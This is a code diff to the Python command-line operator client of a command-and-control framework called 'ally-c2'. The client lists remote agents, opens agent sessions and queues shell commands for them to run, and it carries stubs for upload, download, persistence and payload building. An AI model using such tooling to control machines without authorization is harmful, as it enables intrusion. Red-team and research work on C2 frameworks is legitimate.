@@ -1,9 +1,13 @@
 from os import sendfile
+from re import ASCII
 import readline #for semi shell interaction in input()
 import asyncio
 import json
 import websockets
 
+from prompt_toolkit import PromptSession, print_formatted_text
+from prompt_toolkit.formatted_text import ANSI
+from prompt_toolkit.patch_stdout import patch_stdout
 
 #-----
 #### colors for printing #####
@@ -55,13 +59,12 @@ def all_actions(actions):
     if actions == "main":
         print(f"""
     normal prompt
-    - exit
     - help
     - clear
     - build
         ip||url /port/ windows||linux
 
-    - list-agent 
+    - list-agents 
     - use <agent id>
 
               """)
@@ -88,74 +91,10 @@ def all_actions(actions):
     
 
 def clear():
-    print("\033[2J\033[H", end="")
+    print_formatted_text(ANSI("\033[2J\033[H" ))
 def command_not_fount():
-    print(f"-- [{RED}-{RESET}] command not found")
+    print_formatted_text(ANSI(f"-- [{RED}-{RESET}] command not found"))
 #-----
-
-
-
-async def use_agent(websocket, agent_id):
-
-    while True:
-        shell_cmd = await asyncio.to_thread(input, f"{BOLD}{PURPLE}agent{RESET}{BOLD}[{agent_id}]{RESET}[ally-c2] > ")
-        shell_cmd= shell_cmd.strip().lower()
-
-        if not shell_cmd:
-            continue
-
-        parts = shell_cmd.split()
-        action = parts[0]
-        
-        if action == "back":
-            print(f"\n{BLUE}[*]{RESET} exit use mode\n")
-            return
-        elif action == "help":
-            all_actions("use")
-            continue
-        elif action == "clear":
-            clear()
-            continue
-
-        elif action == "sh":
-                if len(parts) < 2:
-                    print(f"[{RED}-{RESET}] Error: specify command (es. sh ls)")
-                    continue
-                
-                sh_cmd = " ".join(parts[1:])
-                #send cmd to server
-                await useMode_wsCom(websocket, "queue_task", agent_id, sh_cmd)
-                
-                ## blocking output NEED TO CHANGE THIS
-                print(f"{BLUE}[*] Waiting for output...{RESET}")
-                try:
-                    response_raw = await asyncio.wait_for(websocket.recv(), timeout=5.0)
-                    response = json.loads(response_raw)
-                    
-                    if response.get("type") == "agent_output":
-                        print(f"\n{response.get('output')}\n")
-                    else:
-                        print(f"\n[Response] -> {response}\n")
-                except asyncio.TimeoutError:
-                    print(f"\n{RED}[!] Timeout: agent did not reply within 5 seconds.{RESET}\n")
-                continue
-
-        # elif action == "download":
-        #
-        #     await useMode_wsCom(websocket,action,agent_id)
-        #     continue
-        #
-        # elif action == "upload":
-        #     await useMode_wsCom(websocket,action,agent_id)
-        #     continue
-        #
-        # elif action == "percistance":
-        #     await useMode_wsCom(websocket,action,agent_id)
-        #     continue
-
-        else:
-            command_not_fount()
-            
 
 
 
@@ -172,68 +111,148 @@ async def useMode_wsCom(websocket, action, agent_id, data):
     response_raw = await websocket.recv()
     response = json.loads(response_raw)
     
-    print(f"\n[Server Response] :\n{response.get('output')}\n")
+    print_formatted_text(ANSI(f"\n[Server Response] :\n{response.get('output')}\n"))
+
+async def event_listener(event_url):
+    try:
+        print(f"\n[DEBUG] connect to channer events: {event_url}")
+        async with websockets.connect(event_url) as ws:
+            print(f"[DEBUG] channel connected waiting for data")
+            while True:
+                response_raw = await ws.recv()
+                print(f"[DEBUG] Ricevuto dal server eventi: {response_raw}")
+                
+                response = json.loads(response_raw)
+                if response.get("type") == "agent_output":
+                    msg = f"\n{GREEN}[*] Output da agent[{response.get('agent_id')}]:{RESET}\n{response.get('output')}\n"
+                    print_formatted_text(ANSI(msg))
+                    
+    except websockets.exceptions.ConnectionClosed as e:
+        print(f"\n{RED}[-] WebSocket closed form server: {e}{RESET}")
+    except Exception as e:
+        print(f"\n{RED}[-] ctical error in event_listener: {e}{RESET}")
 
 
 
-async def main(server_url):
 
+async def use_agent(websocket, agent_id, session):
+
+    with patch_stdout():
+        while True:
+            shell_cmd = await session.prompt_async(ANSI(f"{BOLD}{PURPLE}agent{RESET}{BOLD}[{agent_id}]{RESET}[ally-c2] > "))
+            shell_cmd= shell_cmd.strip().lower()
+
+            if not shell_cmd:
+                continue
+
+            parts = shell_cmd.split()
+            action = parts[0]
+            
+            if action == "back":
+                print_formatted_text(ANSI(f"\n{BLUE}[*]{RESET} exit use mode\n"))
+                return
+            elif action == "help":
+                all_actions("use")
+                continue
+            elif action == "clear":
+                clear()
+                continue
+
+            elif action == "sh":
+                if len(parts) < 2:
+                    print_formatted_text(ANSI(f"[{RED}-{RESET}] Error: specify command (es. sh ls)"))
+                    continue
+                
+                sh_cmd = " ".join(parts[1:])
+                
+                payload = {
+                    "action": "queue_task",
+                    "agent_id": agent_id,
+                    "data": sh_cmd
+                }
+                await websocket.send(json.dumps(payload))
+                _ = await websocket.recv()
+                
+                print_formatted_text(ANSI(f"\n{BLUE}[*] Task queued. Output will arrive via background stream.{RESET}\n"))
+                continue
+
+            # elif action == "download":
+            #
+            #     await useMode_wsCom(websocket,action,agent_id)
+            #     continue
+            #
+            # elif action == "upload":
+            #     await useMode_wsCom(websocket,action,agent_id)
+            #     continue
+            #
+            # elif action == "percistance":
+            #     await useMode_wsCom(websocket,action,agent_id)
+            #     continue
+
+            else:
+                command_not_fount()
+
+
+
+
+async def main(server_url, event_url):
     if not warning():
         return
 
     print(f"\n\n{BOLD}welcome{RESET} to the ally-cII pannel use {BOLD}/help{RESET} to view")
     print(f"all the possible actions\n")
-   
+
+    session = PromptSession()
 
     try: 
         async with websockets.connect(server_url) as websocket:
-            while True:
-                cmd = await asyncio.to_thread(input, f"{BOLD}{RED}server{RESET}[ally-c2] > ")
-                cmd = cmd.strip().lower()
+            asyncio.create_task(event_listener(event_url)) 
 
-                if not cmd:
-                    continue
-                parts = cmd.lower().split()
-                action = parts[0]
+            with patch_stdout():
+                while True:
+                    cmd = await session.prompt_async(ANSI(f"{BOLD}{RED}server{RESET}[ally-c2] > "))
+                    cmd = cmd.strip().lower()
 
-
-                if action == "exit":
-                    print("\nthanks for using ally-c2!\n")
-                    return
-                elif action == "help":
-                    all_actions("main")
-                    continue
-                elif action == "clear":
-                    clear()
-                    continue
-                elif action == "build":
-                    print("working on")
-                    continue
+                    if not cmd:
+                        continue
+                    parts = cmd.lower().split()
+                    action = parts[0]
 
 
+                    if action == "help":
+                        all_actions("main")
+                        continue
+                    elif action == "clear":
+                        clear()
+                        continue
+                    elif action == "build":
+                        print("working on")
+                        continue
 
 
-                elif action == "list-agent":
-                    payload = {"action": "list_agents"}
-                    await websocket.send(json.dumps(payload))
-                    response = json.loads(await websocket.recv())
-                    print(f"\n[Active Agents]:\n {response.get('agents')}\n")
-                    continue
 
-                elif action == "use":
-                    if len(parts) < 2:
-                        print(f"[{RED}-{RESET}] Error: you have to specify the Agent id (es. use 123)")
+
+                    elif action == "list-agents":
+                        payload = {"action": "list_agents"}
+                        await websocket.send(json.dumps(payload))
+                        response = json.loads(await websocket.recv())
+                        print(f"\nActive Agents:\n\n{response.get('agents')}\n")
+                        continue
+
+                    elif action == "use":
+                        if len(parts) < 2:
+                            print_formatted_text(ANSI(f"[{RED}-{RESET}] Error: you have to specify the Agent id (es. use 123)"))
+                            continue
+                        
+                        agent_id = parts[1]
+                        print_formatted_text(ANSI(f"\n{BLUE}[*]{RESET} Entered agent session: {agent_id}\n"))
+                        
+                        await use_agent(websocket, agent_id, session) 
                         continue
                     
-                    agent_id = parts[1]
-                    print(f"\n{BLUE}[*]{RESET} Entered agent session: {agent_id}\n")
-                    
-                    await use_agent(websocket, agent_id)
-                    continue
-                
 
-                else:
-                    command_not_fount()
+                    else:
+                        command_not_fount()
 
 
 
@@ -253,9 +272,10 @@ async def main(server_url):
 if __name__ == "__main__":
 
     server_url = "ws://192.168.1.172:8080/ws/operator"
+    events_url= "ws://192.168.1.172:8080/ws/events"
 
     try:
-        asyncio.run(main(server_url))
+        asyncio.run(main(server_url,events_url))
     except KeyboardInterrupt:
         print(f"\n[{RED}*{RESET}] forced exit form ally-c2 CLI-CLIENT.")
 
